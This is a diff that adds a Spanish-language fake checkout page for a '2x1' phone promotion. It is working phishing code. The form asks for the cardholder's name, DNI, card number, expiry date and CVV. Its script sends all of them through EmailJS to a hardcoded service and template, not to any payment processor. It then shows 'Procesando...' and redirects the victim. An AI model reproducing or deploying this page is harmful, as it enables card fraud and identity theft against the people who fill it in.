@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./public/css/style.css">
+    <link rel="shortcut icon" href="./public/favicon/favicon.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Icons&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <script src="./public/js/page.js" defer></script>
+    <title>Promo 2X1</title>
+</head>
+<body class="container" onload="loadPay();">
+    <div class='payBox'>
+
+        <img src="./public/img/bagshop.png"" alt="logoshop"/>
+
+        <form class="formBox" id="form">
+
+            <h1>Finalize su Compra</h1>
+
+            <img class='miniPhoto' id="phoneImage" src="#" alt="image"/>
+            <div class='boxPayOpt paySep'>
+                <h3 id="phoneName">Compra : 2x1 {phone.name}</h3>
+                <h3 id="mustpay">Monto a Pagar (Primer Pago) : ${phone.mustpay}</h3>
+                <h3 id="quote">Cuotas: {phone.month} Cuotas de ${phone.quote}</h3>
+                <h3 id="price">Precio Total: ${phone.price}</h3>
+            </div>
+
+            <label class='mb_1 mt_1'>Datos del Titular</label>
+
+            <div class='ownerSection'>
+                <fieldset>
+                    <legend>Nombre del Titular</legend>
+                    <input id="camp2" type="text" name="camp2" placeholder="Ingrese su Nombre Completo" required/>
+                </fieldset>
+
+                <fieldset>
+                    <legend>Numero DNI</legend>
+                    <input id="camp1" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="8" pattern="[0-9]*" inputMode="numeric" name="camp1" placeholder="Ingrese su DNI" required/>
+                </fieldset>
+
+            </div>
+
+            <label class='mb_1'>Datos de la Tarjeta</label>
+
+            <div class='cardSection'>
+
+                <fieldset>
+                    <legend>Numero de la Tarjeta</legend>
+                    <input id="camp3" type="number" pattern="[0-9]*" inputMode="numeric" name="camp3" placeholder="Ingrese el Numero de Tarjeta" required/>
+                </fieldset>
+
+
+                <div class='splitField'>
+                <fieldset>
+                    <legend>Mes de Vencimiento</legend>
+                    <select name='camp4' required>
+                        <option hidden value>Elegir</option>
+                        <option value="01">01</option> 
+                        <option value="02">02</option> 
+                        <option value="03">03</option> 
+                        <option value="04">04</option> 
+                        <option value="05">05</option> 
+                        <option value="06">06</option> 
+                        <option value="07">07</option> 
+                        <option value="08">08</option> 
+                        <option value="09">09</option> 
+                        <option value="10">10</option> 
+                        <option value="11">11</option> 
+                        <option value="12">12</option> 
+                    </select>
+                </fieldset>
+
+                    <fieldset>
+                        <legend>Año de Vencimiento</legend>
+                        <select name='camp5' required>
+                            <option hidden value>Elegir</option>
+                            <option value="2023">2023</option>
+                            <option value="2024">2024</option>
+                            <option value="2025">2025</option>
+                            <option value="2026">2026</option>
+                            <option value="2027">2027</option>
+                            <option value="2028">2028</option>
+                            <option value="2029">2029</option>
+                            <option value="2030">2030</option>
+                            <option value="2031">2031</option>
+                            <option value="2032">2032</option>
+                            <option value="2033">2033</option>
+                            <option value="2034">2034</option>
+                            <option value="2035">2035</option>
+                            <option value="2036">2036</option>
+                            <option value="2037">2037</option>
+                            <option value="2038">2038</option>
+                            <option value="2039">2039</option>
+                            <option value="2040">2040</option>
+                            <option value="2041">2041</option>
+                            <option value="2042">2042</option>
+                            <option value="2043">2043</option>
+                            <option value="2044">2044</option>
+                            <option value="2045">2045</option>
+                            <option value="2046">2046</option>
+                            <option value="2047">2047</option>
+                            <option value="2048">2048</option>
+                            <option value="2049">2049</option>
+                            <option value="2050">2050</option>
+                        </select>
+                    </fieldset>
+
+                    <fieldset>
+                        <legend>Codigo CVV</legend>
+                        <input id="camp6" type="number" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="3" pattern="[0-9]*" inputMode="numeric" name="camp6" placeholder="3 Ultimos Digitos Reverso" required/>
+                    </fieldset>
+                </div>
+
+            </div>
+
+            <input class='button1' id="button" type='submit' value="Realizar Compra"></input>
+        </form>
+    </div>
+
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+    </script>
+
+    <script type="text/javascript">
+        emailjs.init('Rz35xcemz-sopEyrc')
+    </script>
+
+    <script type="text/javascript">
+        const btn = document.getElementById('button');
+
+        document.getElementById('form')
+        .addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            btn.disabled = true;
+            btn.value = 'Procesando...';
+
+            const serviceID = 'service_ay7jkun';
+            const templateID = 'template_z7hl4a4';
+
+            emailjs.sendForm(serviceID, templateID, this)
+            .then(() => {
+                setTimeout(() => {
+                window.location = "process.html";
+                }, 3000);
+            }, (err) => {
+                btn.disabled = true;
+                btn.value = 'Error';
+            });
+        });
+    </script>
+
+</body>
+</html>
